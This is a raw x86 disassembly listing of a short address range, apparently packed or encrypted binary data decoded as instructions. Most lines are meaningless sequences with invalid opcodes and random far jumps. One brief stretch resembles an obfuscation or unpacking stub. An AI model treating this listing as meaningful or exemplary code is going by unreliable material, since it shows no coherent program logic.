  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	adc    cl,bl
  40bace:	add    dh,BYTE PTR [ebp+edx*4-0x3583837d]
  40bad5:	jns    0x40bb53
  40bad7:	jl     0x40bb26
  40bad9:	call   0xcfe7ef68
  40bade:	xchg   ebx,eax
  40badf:	dec    ecx
  40bae0:	les    ebp,FWORD PTR [ebp+0x61]
  40bae3:	sub    cl,BYTE PTR [esp+edx*1-0x13426e76]
  40baea:	int3   
  40baeb:	cli    
  40baec:	jnp    0x40bb43
  40baee:	or     DWORD PTR [edi-0x30d00044],esp
  40baf4:	or     dh,BYTE PTR [ebx]
  40baf6:	jmp    0xded4:0x6c20d915
  40bafd:	ss call 0xdc6c38f2
  40bb03:	sub    al,0x26
  40bb05:	pop    es
  40bb06:	xor    eax,DWORD PTR [ebx]
  40bb08:	ret    
  40bb09:	test   al,0xb9
  40bb0b:	sbb    al,0x18
  40bb0d:	add    eax,0x8032be69
  40bb12:	retf   0xd77e
  40bb15:	ror    DWORD PTR [esi+esi*2+0x7b],cl
  40bb19:	rcl    DWORD PTR [edi-0x3a],0xc5
  40bb1d:	fistp  DWORD PTR [ecx+0x204a508c]
  40bb23:	mov    eax,0x9787d288
  40bb28:	mov    eax,0x64f1bf1b
  40bb2d:	mov    BYTE PTR [esi+0x79c03610],dh
  40bb33:	adc    eax,0x2b75445a
  40bb38:	xor    edi,DWORD PTR [ebx-0x3e4a655a]
  40bb3e:	test   BYTE PTR [ebx+ecx*2-0x29cad88d],al
  40bb45:	inc    edx
  40bb46:	mov    cl,0xbc
  40bb48:	push   edx
  40bb49:	mov    eax,ds:0x9ce7c24a
  40bb4e:	xor    al,0xfe
  40bb50:	push   0xb6d33ca5
  40bb55:	repnz cwde 
  40bb57:	xchg   DWORD PTR [edx],esi
  40bb59:	cmp    DWORD PTR [eax+0x20],eax
  40bb5c:	sbb    BYTE PTR [ebp+0x46ec0565],0x6d
  40bb63:	xchg   ecx,eax
  40bb64:	pop    ss
  40bb65:	addr16 jl 0x40bb34
  40bb68:	jns    0x40bb5c
  40bb6a:	inc    ecx
  40bb6b:	jmp    0x40bb5f
  40bb6d:	push   esi
  40bb6e:	sti    
  40bb6f:	xor    bh,BYTE PTR [esi]
  40bb71:	addr16 gs pop esp
  40bb74:	push   eax
  40bb75:	pop    edi
  40bb76:	sub    eax,0x8bd5fb2d
  40bb7b:	std    
  40bb7c:	xor    al,0x18
  40bb7e:	shl    DWORD PTR [ebx+0x4a],0xea
  40bb82:	xchg   ebx,eax
  40bb83:	mov    DWORD PTR [ebx+0x1b],esp
  40bb86:	and    BYTE PTR [ebp-0x7004d11e],ch
  40bb8c:	push   ebp
  40bb8d:	inc    edi
  40bb8e:	adc    BYTE PTR [ebx],bh
  40bb90:	mov    esi,0xef2bf58d
  40bb95:	add    eax,0xa2d9c762
  40bb9a:	pop    ss
  40bb9b:	fcmovnbe st,st(7)
  40bb9d:	std    
  40bb9e:	test   eax,0x19af469b
  40bba3:	mov    al,0x62
  40bba5:	das    
  40bba6:	imul   ecx,DWORD PTR [edx-0x3],0x50
  40bbaa:	rol    BYTE PTR [ecx],1
  40bbac:	mov    al,0xdd
  40bbae:	add    eax,0x8e99e1a4
  40bbb3:	xchg   DWORD PTR [ecx+ebp*8-0x265272c7],esi
  40bbba:	rcr    BYTE PTR [esi],cl
  40bbbc:	adc    eax,0x7885ab20
  40bbc1:	xchg   ecx,eax
  40bbc2:	jns    0x40bbe5
  40bbc4:	dec    ecx
  40bbc5:	xchg   ebx,eax
  40bbc6:	stos   BYTE PTR es:[edi],al
  40bbc7:	jmp    0x8ada:0x21efa06d
  40bbce:	fs dec ebx
  40bbd0:	sbb    dl,cl
  40bbd2:	lds    esp,FWORD PTR [ebp+0x22cb6d54]
  40bbd8:	mov    ch,0x85
  40bbda:	sbb    BYTE PTR [edi+0x15],al
  40bbdd:	stos   BYTE PTR es:[edi],al
  40bbde:	adc    eax,0xfc6ffeeb
  40bbe3:	mov    bl,0xec
  40bbe5:	pushf  
  40bbe6:	mov    cl,0x18
  40bbe8:	cld    
  40bbe9:	iret   
  40bbea:	pop    ebp
  40bbeb:	xor    al,bh
  40bbed:	mov    dl,ch
  40bbef:	repz test BYTE PTR [esi+0xa3a054d],cl
  40bbf6:	shl    al,cl
  40bbf8:	sub    eax,0x6d5bc0
  40bbfd:	(bad)
  40bc00:	sbb    ebp,DWORD PTR [edx+0x58d1ba6]
  40bc06:	cmp    DWORD PTR [esi],ecx
  40bc08:	xor    al,0x85
  40bc0a:	jg     0x40bc29
  40bc0c:	add    eax,0xda842a98
  40bc11:	and    eax,0x764793b8
  40bc16:	(bad)  
  40bc17:	lock jns 0x40bc7a
  40bc1a:	inc    esp
  40bc1b:	(bad)  
  40bc1c:	pop    edi
  40bc1d:	fidiv  WORD PTR [edx+0x15]
  40bc20:	test   edi,0xc1cac0cb
  40bc26:	cmp    eax,0x39d36ba
  40bc2b:	jb     0x40bbf7
  40bc2d:	adc    BYTE PTR [edi],cl
  40bc2f:	cmp    BYTE PTR [edi],bh
  40bc31:	aas    
  40bc32:	ins    DWORD PTR es:[edi],dx
  40bc33:	fisttp WORD PTR [esi-0x53bb59d0]
  40bc39:	shl    BYTE PTR ds:0xb284d8da,0x93
  40bc40:	or     edx,edx
  40bc42:	sub    DWORD PTR [eax],esi
  40bc44:	or     esp,edx
  40bc46:	(bad)  
  40bc47:	sti    
  40bc48:	retf   
  40bc49:	std    
  40bc4a:	jl     0x40bc54
  40bc4c:	mov    ebp,0xc532d583
  40bc51:	sahf   
  40bc52:	dec    esp
  40bc53:	rcl    DWORD PTR [ebx-0xb],1
  40bc56:	pop    ss
  40bc57:	xchg   ebx,eax
  40bc58:	ins    DWORD PTR es:[edi],dx
  40bc59:	mov    eax,0x1f5e8b21
  40bc5e:	pop    ds
  40bc5f:	jae    0x40bcb7
  40bc61:	fisubr WORD PTR [eax]
  40bc63:	(bad)  
  40bc64:	or     eax,0xbeec419a
  40bc69:	push   ebp
  40bc6a:	out    dx,al
  40bc6b:	adc    BYTE PTR [esi+0x77],0x1
  40bc6f:	add    al,0x89
  40bc71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc72:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc74:	mov    ?,WORD PTR [ebp-0x7e]
  40bc77:	aam    0x6d
  40bc79:	add    esp,DWORD PTR ds:0x627a1942
  40bc7f:	nop
  40bc80:	fst    QWORD PTR [edx-0x30]
  40bc83:	stos   DWORD PTR es:[edi],eax
  40bc84:	dec    ecx
  40bc85:	das    
  40bc86:	data16 jp 0x40bcd7
  40bc89:	inc    edi
  40bc8a:	and    DWORD PTR [ecx],ebp
  40bc8c:	adc    eax,0x37f9b9b3
  40bc91:	jne    0x40bca7
  40bc93:	retf   0x9442
  40bc96:	fisub  WORD PTR [esi-0x60]
  40bc99:	mov    edx,0x83c40b2
  40bc9e:	sahf   
  40bc9f:	ins    BYTE PTR es:[edi],dx
  40bca0:	sbb    DWORD PTR [edi],edi
  40bca2:	push   ebx
  40bca3:	into   
  40bca4:	cmp    DWORD PTR [edi],ecx
  40bca6:	fwait
  40bca7:	jns    0x40bd17
  40bca9:	jae    0x40bca6
  40bcab:	mov    ecx,ecx
  40bcad:	jge    0x40bcec
  40bcaf:	out    0x60,eax
  40bcb1:	fdiv   QWORD PTR [eax+0x5707784d]
  40bcb7:	xor    eax,0xfb2468d7
  40bcbc:	sbb    eax,edx
  40bcbe:	and    DWORD PTR [edx],esi
  40bcc0:	sbb    eax,0xc661c745
  40bcc5:	fsub   QWORD PTR [ecx-0x2f5387d6]
  40bccb:	out    dx,al
  40bccc:	push   ss
  40bccd:	xchg   ebp,eax
  40bcce:	xchg   edi,eax
  40bccf:	inc    edx
  40bcd0:	stos   BYTE PTR es:[edi],al
  40bcd1:	push   ds
  40bcd2:	cmp    edi,DWORD PTR [edx+0x2d]
  40bcd5:	mov    gs,WORD PTR [ecx]
  40bcd7:	fist   WORD PTR [eax-0x69ba2a7]
  40bcdd:	call   0x350aad2b
  40bce2:	xlat   BYTE PTR ds:[ebx]
  40bce3:	inc    ecx
  40bce4:	rcl    BYTE PTR [edx],cl
  40bce6:	add    bl,BYTE PTR [eax+0x4e69785f]
  40bcec:	dec    ebp
  40bced:	jecxz  0x40bcb1
  40bcef:	fiadd  WORD PTR [ebx]
  40bcf1:	mov    edx,0xb59627d0
  40bcf6:	sar    BYTE PTR [esi+eiz*1+0x6a],0x3a
  40bcfb:	cmp    ebx,DWORD PTR [ebp-0x27]
  40bcfe:	aaa    
  40bcff:	(bad)  
  40bd00:	jecxz  0x40bd73
  40bd02:	dec    edi
  40bd03:	sbb    BYTE PTR [ecx-0x75],ah
  40bd06:	fucomp st(6)
  40bd08:	mov    eax,ds:0x7a17ecca
  40bd0d:	sub    al,0xe1
  40bd0f:	xor    BYTE PTR [edx+0x48],ah
  40bd12:	fcomp  QWORD PTR [ecx+eax*1]
  40bd15:	ins    BYTE PTR es:[edi],dx
  40bd16:	xchg   edx,eax
  40bd17:	retf   0xf88e
  40bd1a:	out    0x23,al
  40bd1c:	lds    eax,FWORD PTR [edi+0x74]
  40bd1f:	iret   
  40bd20:	xchg   esp,eax
  40bd21:	aad    0xa8
  40bd23:	jae    0x40bd1c
  40bd25:	and    eax,0xe66ff65a
  40bd2a:	push   edi
  40bd2b:	jbe    0x40bcd1
  40bd2d:	add    esp,DWORD PTR [ecx]
  40bd2f:	jb     0x40bd4a
  40bd31:	ret    0xd777
  40bd34:	add    DWORD PTR [eax+edx*1+0x3a],0xffffff89
  40bd39:	inc    ecx
  40bd3a:	into   
  40bd3b:	test   BYTE PTR [esi+ebp*1-0x5c1bc000],0x69
  40bd43:	mov    cl,0x50
  40bd45:	push   esp
  40bd46:	mov    eax,0x4ab06941
  40bd4b:	and    dh,BYTE PTR [edx]
  40bd4d:	jl     0x40bdae
  40bd4f:	aas    
  40bd50:	jnp    0x40bda5
  40bd52:	xor    al,BYTE PTR [esi+0x39a8767a]
  40bd58:	cli    
  40bd59:	dec    ebp
  40bd5a:	pusha  
  40bd5b:	pop    esi
  40bd5c:	add    edx,DWORD PTR [ebp+eax*8+0x15]
  40bd60:	enter  0xe924,0x64
  40bd64:	xchg   BYTE PTR [ebp-0x3e],bl
  40bd67:	fdivr  DWORD PTR [ebp-0x2c]
  40bd6a:	fisubr DWORD PTR [edi+0x32]
  40bd6d:	mov    ?,WORD PTR [edi]
  40bd6f:	inc    esi
  40bd70:	cmc    
  40bd71:	retf   0x6743
  40bd74:	dec    edi
  40bd75:	and    bl,BYTE PTR [edi+ebp*2-0xf0e6f96]
  40bd7c:	repnz mov WORD PTR [edx-0x45],ds
  40bd80:	xchg   ebx,eax
  40bd81:	aas    
  40bd82:	das    
  40bd83:	bound  edx,QWORD PTR [ecx-0x17]
  40bd86:	sub    esi,DWORD PTR [edi]
  40bd88:	mov    BYTE PTR [eax-0x34a9f92b],dh
  40bd8e:	mov    cs,WORD PTR [eax]
  40bd90:	sub    al,0x26
  40bd92:	inc    ecx
  40bd93:	sub    DWORD PTR [esp+edi*4-0x44],ebp
  40bd97:	in     al,0x39
  40bd99:	imul   eax,DWORD PTR [ebx+0x74d001fe],0x58ad3a02
  40bda3:	xor    eax,0xcd8b9150
  40bda8:	jno    0x40bd41
  40bdaa:	fadd   st,st(0)
  40bdac:	fadd   st(1),st
  40bdae:	sbb    al,0x83
  40bdb0:	adc    BYTE PTR [ebx],dl
  40bdb2:	lods   eax,DWORD PTR ds:[esi]
  40bdb3:	icebp  
  40bdb4:	ins    BYTE PTR es:[edi],dx
  40bdb5:	mov    DWORD PTR [esi+ebx*8-0x11],ebp
  40bdb9:	addr16 pop ds
  40bdbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdbc:	add    esi,esp
  40bdbe:	fs push ecx
  40bdc0:	sbb    eax,0x1a3c477c
  40bdc5:	xchg   ecx,eax
  40bdc6:	jne    0x40bdf7
  40bdc8:	jno    0x40be37
  40bdca:	iret   
  40bdcb:	retf   
  40bdcc:	push   esp
  40bdcd:	sub    al,0xd3
  40bdcf:	inc    esp
  40bdd0:	jl     0x40be0e
  40bdd2:	add    dh,BYTE PTR [eax-0x248efa19]
  40bdd8:	test   ebx,edi
  40bdda:	pop    ss
  40bddb:	push   ds
  40bddc:	dec    eax
  40bddd:	jno    0x40be3b
  40bddf:	aam    0xc7
  40bde1:	mov    al,ds:0xc2721bf4
  40bde6:	call   0x924:0x5680771d
  40bded:	mov    ecx,0xa4047b6
  40bdf2:	push   edx
  40bdf3:	arpl   WORD PTR [edx+0x6c],dx
  40bdf6:	jmp    0x40be3b
  40bdf8:	mov    BYTE PTR [edx-0x1a],ah
  40bdfb:	sbb    dl,BYTE PTR [eax]
  40bdfd:	idiv   DWORD PTR [edx]
  40bdff:	int    0xfb
  40be01:	pushf  
  40be02:	iret   
  40be03:	or     ah,dh
  40be05:	xlat   BYTE PTR ds:[ebx]
  40be06:	fldenv [edx-0x47]
  40be09:	push   esp
  40be0a:	sbb    eax,eax
  40be0c:	mov    bl,0x8e
  40be0e:	push   0xffffffbf
  40be10:	inc    ebx
  40be11:	repnz dec ebp
  40be13:	mov    BYTE PTR es:[edx-0x70],cl
  40be17:	add    dh,bl
  40be19:	mov    ds:0xa44841eb,eax
  40be1e:	xlat   BYTE PTR ds:[ebx]
  40be1f:	mov    ecx,0xb1f26c77
  40be24:	mov    esi,0x6db18f4b
  40be29:	mov    eax,ds:0xc0dc4d58
  40be2e:	mov    DWORD PTR [ebp-0x24],edx
  40be31:	mov    edx,DWORD PTR [ebp-0x8]
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	adc    edx,edi
  40be67:	outs   dx,DWORD PTR ds:[esi]
  40be68:	jg     0x40becd
  40be6a:	mov    WORD PTR [esp+edi*2-0x36],?
  40be6e:	jns    0x40beec
  40be70:	jl     0x40be98
  40be72:	pop    edx
  40be73:	(bad)  [ecx+0x1]
  40be76:	sbb    eax,0xf3807264
  40be7b:	xor    eax,0x27f289bc
  40be80:	mov    eax,0x4d94125a
  40be85:	test   DWORD PTR [ebx-0xf026dd4],edx
  40be8b:	pop    ebp
  40be8c:	sub    ecx,edi
  40be8e:	jecxz  0x40be63
  40be90:	dec    ecx
  40be91:	xor    al,0x1b
  40be93:	xchg   dl,cl
  40be95:	add    dl,BYTE PTR [ebx+edx*4-0x5658bde3]
  40be9c:	(bad)  
  40be9d:	push   ss
  40be9e:	es xchg ax,ax
  40bea1:	cmp    eax,edx
  40bea3:	push   edx
  40bea4:	mov    ebx,0x6f1d7784
  40bea9:	xor    al,BYTE PTR [edi]
  40beab:	mov    ch,0x59
  40bead:	pop    ds
  40beae:	jbe    0x40bf0c
  40beb0:	les    eax,FWORD PTR [edx+0x688b9280]
  40beb6:	push   0x8
  40beb8:	out    dx,eax
  40beb9:	jnp    0x40bf22
  40bebb:	icebp  
  40bebc:	and    esi,ebp
  40bebe:	push   0xffffff88
  40bec0:	cwde   
  40bec1:	mov    bh,0x28
  40bec3:	cmp    DWORD PTR [eax-0x37],edi
  40bec6:	fdiv   QWORD PTR [ebp+edx*8+0x4a12330e]
  40becd:	or     eax,esi
  40becf:	in     eax,0xc6
  40bed1:	sbb    ah,BYTE PTR [ebx]
  40bed3:	push   ebp
  40bed4:	fwait
  40bed5:	popf   
  40bed6:	fbld   TBYTE PTR [edx-0x143de009]
  40bedc:	repz sub eax,0x781634ad
  40bee2:	jmp    0x30be4978
  40bee7:	sub    al,0x71
  40bee9:	sub    BYTE PTR [ebx],0x6
  40beec:	cs out 0xa9,al
  40beef:	and    esi,DWORD PTR [ebx-0x4f]
  40bef2:	lods   al,BYTE PTR ds:[esi]
  40bef3:	inc    ebp
  40bef4:	in     eax,0x67
  40bef6:	in     al,0x75
  40bef8:	or     esp,esp
  40befa:	ret    0xb048
  40befd:	sbb    al,0x62
  40beff:	or     ch,ah
  40bf01:	inc    esp
  40bf02:	mov    ebp,0xed30b360
  40bf07:	inc    esi
  40bf08:	stos   BYTE PTR es:[edi],al
  40bf09:	and    ecx,DWORD PTR [ebx+0x1]
  40bf0c:	pop    ss
  40bf0d:	pop    edx
  40bf0e:	stc    
  40bf0f:	loopne 0x40bf46
  40bf11:	test   DWORD PTR [esi-0x2],ebp
  40bf14:	push   edx
  40bf15:	dec    edx
  40bf16:	xchg   edi,eax
  40bf17:	stc    
  40bf18:	fnstcw WORD PTR [esi-0x67]
  40bf1b:	push   ebx
  40bf1c:	sub    ecx,DWORD PTR ds:0xfacbd405
  40bf22:	xchg   DWORD PTR [edx+0x751c8132],esi
  40bf28:	add    edx,DWORD PTR [edi]
  40bf2a:	xor    BYTE PTR [ebp+0x26],ah
  40bf2d:	mov    eax,0x3ce347f1
  40bf32:	dec    edx
  40bf33:	mov    bl,0x7
  40bf35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf36:	push   cs
  40bf37:	xchg   edx,eax
  40bf38:	(bad)  
  40bf39:	mov    ah,BYTE PTR [edi-0x1ea4c206]
  40bf3f:	into   
  40bf40:	sub    ebp,DWORD PTR [edi-0x6638633e]
  40bf46:	xor    al,BYTE PTR [edi-0x18]
  40bf49:	test   DWORD PTR [edi+0x37f9f836],0xb1d582e4
  40bf53:	add    al,0x6c
  40bf56:	jle    0x40bfbe
  40bf58:	sub    cl,BYTE PTR [eax]
  40bf5a:	mov    al,ds:0xf77b9c7
  40bf5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf60:	mov    al,0x22
  40bf62:	ja     0x40bfbd
  40bf64:	cmc    
  40bf65:	scas   al,BYTE PTR es:[edi]
  40bf66:	scas   eax,DWORD PTR es:[edi]
  40bf67:	or     esp,edx
  40bf69:	mov    al,ds:0xd4db0830
  40bf6e:	dec    ecx
  40bf6f:	cmc    
  40bf70:	push   esp
  40bf71:	stc    
  40bf72:	fcomp  QWORD PTR [ebp+0x19e00c2f]
  40bf78:	xchg   edx,eax
  40bf79:	scas   eax,DWORD PTR es:[edi]
  40bf7a:	xlat   BYTE PTR ds:[ebx]
  40bf7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf7c:	call   0x29fe:0xdb32d1f6
  40bf83:	xlat   BYTE PTR ds:[ebx]
  40bf84:	test   ch,ch
  40bf86:	int3   
  40bf87:	jns    0x40bff7
  40bf89:	outs   dx,DWORD PTR ds:[esi]
  40bf8a:	lods   eax,DWORD PTR ds:[esi]
  40bf8b:	call   0xf659ee1f
  40bf90:	pushf  
  40bf91:	dec    edx
  40bf92:	iret   
  40bf93:	xchg   ebp,eax
  40bf94:	or     BYTE PTR [ebx],dl
  40bf96:	shl    BYTE PTR ds:0xc98a84b6,1
  40bf9c:	outs   dx,BYTE PTR ds:[esi]
  40bf9d:	data16 xchg BYTE PTR [ecx],bl
  40bfa0:	inc    ebx
  40bfa1:	aaa    
  40bfa2:	inc    edi
  40bfa3:	mov    edi,0x49d167f0
  40bfa8:	push   ss
  40bfa9:	lock sbb DWORD PTR [ebx-0x5dd17315],edi
  40bfb0:	or     BYTE PTR [eax+0x67e4454d],dl
  40bfb6:	leave  
  40bfb7:	jp     0x40bf4f
  40bfb9:	sbb    al,0xad
  40bfbb:	mov    edi,0x596936f5
  40bfc0:	xchg   edx,eax
  40bfc1:	inc    ebp
  40bfc2:	mov    ds:0x3e985842,eax
  40bfc7:	jns    0x40bfbe
  40bfc9:	add    esi,esp
  40bfcb:	mov    dh,0x96
  40bfcd:	outs   dx,DWORD PTR ds:[esi]
  40bfce:	push   0xffffffd0
  40bfd0:	adc    dl,BYTE PTR [eax+0x6e]
  40bfd3:	cld    
  40bfd4:	xor    al,0xaa
  40bfd6:	ret    0x1151
  40bfd9:	sbb    DWORD PTR [edx+0xd],esp
  40bfdc:	in     eax,dx
  40bfdd:	pop    es
  40bfde:	pop    ecx
  40bfdf:	sub    DWORD PTR [ebp-0x53],edx
  40bfe2:	ficomp WORD PTR [esi-0x8b72a7c]
  40bfe8:	mov    BYTE PTR [ebp-0x28],bl
  40bfeb:	pop    ss
  40bfec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfed:	idiv   edx
  40bfef:	fdiv   QWORD PTR [esi]
  40bff1:	test   DWORD PTR [ecx-0x68],ebx
  40bff4:	mov    edi,0x442c9278
  40bff9:	ins    BYTE PTR es:[edi],dx
  40bffa:	adc    BYTE PTR [ecx-0x20],al
  40bffd:	sub    ebp,DWORD PTR [edi+0x5e]
  40c000:	dec    esp
  40c001:	and    dl,ch
  40c003:	retf   0xac0c
  40c006:	xchg   ecx,eax
  40c007:	out    dx,eax
  40c008:	out    0x8,al
  40c00a:	call   0xa285:0x708eb6a1
  40c011:	arpl   WORD PTR [esi-0x17],bp
  40c014:	ins    BYTE PTR es:[edi],dx
  40c015:	pop    edi
  40c016:	outs   dx,DWORD PTR ds:[esi]
  40c017:	sub    al,0xe5
  40c019:	ins    DWORD PTR es:[edi],dx
  40c01a:	jnp    0x40bfac
  40c01c:	xchg   ebx,eax
  40c01d:	inc    esp
  40c01e:	pop    edi
  40c01f:	das    
  40c020:	dec    edi
  40c021:	arpl   dx,dx
  40c023:	mov    al,0xe2
  40c025:	xchg   esp,eax
  40c026:	aam    0x2
  40c028:	jo     0x40c06b
  40c02a:	inc    edi
  40c02b:	(bad)  
  40c02c:	mov    al,ds:0xb362163e
  40c031:	jmp    0xe1e:0xed4e1013
  40c038:	jge    0x40c08b
  40c03a:	dec    esp
  40c03b:	mov    al,0xb
  40c03d:	imul   ebx,DWORD PTR [esi+0x674ed251],0xffffffe5
  40c044:	mov    fs,WORD PTR [edx-0x2f1be7e6]
  40c04a:	jmp    0x30e14bf5
  40c04f:	cmp    eax,0xe1065519
  40c054:	retf   
  40c055:	jnp    0x40c097
  40c057:	arpl   bp,ax
  40c059:	cdq    
  40c05a:	or     BYTE PTR [ebx+eax*8-0x3fc4dcfc],al
  40c061:	sub    dl,ch
  40c063:	stos   BYTE PTR es:[edi],al
  40c064:	mov    cl,0x71
  40c066:	mov    ebp,DWORD PTR [edi]
  40c068:	sub    DWORD PTR [ecx-0x1e],eax
  40c06b:	scas   eax,DWORD PTR es:[edi]
  40c06c:	or     dl,BYTE PTR [ecx]
  40c06e:	sub    al,0x63
  40c070:	lds    ebx,FWORD PTR [ecx+0x56]
  40c073:	sbb    BYTE PTR [esi+0x9],al
  40c076:	add    eax,0xfc5e9b25
  40c07b:	mov    ah,0xd8
  40c07d:	xor    BYTE PTR [ebx],0xa4
  40c080:	inc    eax
  40c081:	cmc    
  40c082:	jbe    0x40c098
  40c084:	pop    edx
  40c085:	inc    esp
  40c086:	push   eax
  40c087:	jno    0x40c087
  40c089:	addr16 inc esp
  40c08b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08c:	sub    BYTE PTR [ebx+0x11],0x5a
  40c090:	xchg   BYTE PTR [ecx],dh
  40c092:	bound  eax,QWORD PTR [ebx]
  40c094:	dec    eax
  40c095:	jecxz  0x40c07d
  40c097:	test   ecx,0x806db603
  40c09d:	and    DWORD PTR [ebx+0x3fc19004],ebx
  40c0a3:	mov    cl,0x55
  40c0a5:	in     al,0x59
  40c0a7:	loope  0x40c07b
  40c0a9:	mov    bl,0x52
  40c0ab:	xor    DWORD PTR [edx+0x8],0xc2ad2c27
  40c0b2:	jmp    0x509c3ef7
  40c0b7:	ins    DWORD PTR es:[edi],dx
  40c0b8:	or     DWORD PTR [esi-0x56],0x5c
  40c0bc:	out    0xc4,al
  40c0be:	fwait
  40c0bf:	or     DWORD PTR [ebx+eiz*1],edi
  40c0c2:	not    DWORD PTR [ebx+edx*2-0xb]
  40c0c6:	aaa    
  40c0c7:	cmp    eax,0x816254d9
  40c0cc:	push   ds
  40c0cd:	sbb    edx,DWORD PTR [edi]
  40c0cf:	add    BYTE PTR [eax],bl
  40c0d1:	push   ebp
  40c0d2:	lods   al,BYTE PTR ds:[esi]
  40c0d3:	mov    ds:0x5db7a327,eax
  40c0d8:	shr    BYTE PTR [esi-0x2251bbcf],1
  40c0de:	sub    al,0xe5
  40c0e0:	push   0x5c74107a
  40c0e5:	mov    ds:0xd1509c6b,eax
  40c0ea:	hlt    
  40c0eb:	pop    esp
  40c0ec:	aam    0x9f
  40c0ee:	addr16 mov eax,0xca51576c
  40c0f4:	push   esi
  40c0f5:	ja     0x40c08a
  40c0f7:	mov    eax,ds:0x51ad8675
  40c0fc:	jo     0x40c0f2
  40c0fe:	and    bh,0x6e
  40c101:	pop    ss
  40c102:	mov    al,ds:0x4fb9662b
  40c107:	call   DWORD PTR [edi]
  40c109:	enter  0xe08f,0xa6
  40c10d:	xor    al,0xfb
  40c10f:	sbb    BYTE PTR [ebp-0x5f74302b],al
  40c115:	cli    
  40c116:	mov    ds:0x6be63c0c,al
  40c11b:	mov    dl,0xfc
  40c11d:	xor    eax,0x3765ed0b
  40c122:	cwde   
  40c123:	repnz xchg ecx,eax
  40c125:	outs   dx,DWORD PTR ds:[esi]
  40c126:	xor    eax,0x4ec75439
  40c12b:	cld    
  40c12c:	out    dx,eax
  40c12d:	pop    ecx
  40c12e:	push   ds
  40c12f:	cmp    eax,0x12a6b814
  40c134:	in     al,0xa1
  40c136:	jp     0x40c145
  40c138:	pop    eax
  40c139:	loope  0x40c106
  40c13b:	mov    dh,0xf9
  40c13d:	rol    BYTE PTR [ebx+0x14],0x10
  40c141:	jns    0x40c146
  40c143:	xor    BYTE PTR [ecx],al
  40c145:	enter  0xc6c,0x77
  40c149:	loope  0x40c183
  40c14b:	adc    eax,0x49549d23
  40c150:	dec    BYTE PTR [eax]
  40c152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c153:	dec    eax
  40c154:	jns    0x40c15c
  40c156:	scas   eax,DWORD PTR es:[edi]
  40c157:	adc    ebp,edi
  40c159:	dec    ecx
  40c15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c15b:	popf   
  40c15c:	pushf  
  40c15d:	inc    esi
  40c15e:	mov    bl,cl
  40c160:	jno    0x40c106
  40c162:	sahf   
  40c163:	pop    ecx
  40c164:	cs icebp 
  40c166:	jmp    0x40c14b
  40c168:	add    eax,0x44aaf0ca
  40c16d:	stos   BYTE PTR es:[edi],al
  40c16e:	std    
  40c16f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c170:	int3   
  40c171:	clc    
  40c172:	sbb    BYTE PTR [edx-0x2d],ch
  40c175:	scas   al,BYTE PTR es:[edi]
  40c176:	out    dx,al
  40c177:	xchg   ebp,eax
  40c178:	push   esp
  40c179:	mov    ecx,?
  40c17b:	loopne 0x40c18e
  40c17d:	aaa    
  40c17e:	pop    es
  40c17f:	repz int3 
  40c181:	int    0xe1
  40c183:	popf   
  40c184:	jb     0x40c177
  40c186:	sbb    ecx,DWORD PTR [esi-0x2b]
  40c189:	loope  0x40c120
  40c18b:	cwde   
  40c18c:	dec    esp
  40c18d:	shl    DWORD PTR [eax-0x9],cl
  40c190:	xchg   edi,eax
  40c191:	aad    0xc1
  40c193:	je     0x40c1e8
  40c195:	popf   
  40c196:	popa   
  40c197:	aas    
  40c198:	(bad)  
  40c19a:	lea    edx,[eax]
  40c19c:	or     edx,edx
  40c19e:	in     eax,dx
  40c19f:	fsub   DWORD PTR [edx]
  40c1a1:	pop    edi
  40c1a2:	clc    
  40c1a3:	je     0x40c195
  40c1a5:	push   esi
  40c1a6:	inc    edi
  40c1a7:	sbb    bh,BYTE PTR [ebp+0x2b]
  40c1aa:	ret    0x20b9
  40c1ad:	and    al,0x7e
  40c1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b0:	jo     0x40c212
  40c1b2:	or     al,0xb4
  40c1b4:	std    
  40c1b5:	pop    ecx
  40c1b6:	fwait
  40c1b7:	xlat   BYTE PTR ds:[ebx]
  40c1b8:	aaa    
  40c1b9:	lock je 0x40c1fd
  40c1bc:	add    BYTE PTR [edi-0x1a515a09],al
  40c1c2:	nop
  40c1c3:	fwait
  40c1c4:	and    al,0x85
  40c1c6:	test   BYTE PTR [ebx],0xd1
  40c1c9:	jmp    0x40cc8f
  40c1ce:	jmp    0x40c541
  40c1d3:	push   ss
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	adc    ecx,esi
  40c1e1:	lock lea edi,[ecx]
  40c1e4:	mov    BYTE PTR [esp+edi*2-0x36],bh
  40c1e8:	jns    0x40c266
  40c1ea:	jl     0x40c1e7
  40c1ec:	frstor [ecx+0x8]
  40c1ef:	ds jb  0x40c18d
  40c1f2:	mov    esp,0xfcbb690e
  40c1f7:	aam    0xf6
  40c1f9:	sub    DWORD PTR [eax+eiz*4-0x77],0x1ab62736
  40c201:	pop    ss
  40c202:	cmp    al,0x32
  40c204:	adc    eax,0x660c7515
  40c209:	xchg   esi,eax
  40c20a:	fwait
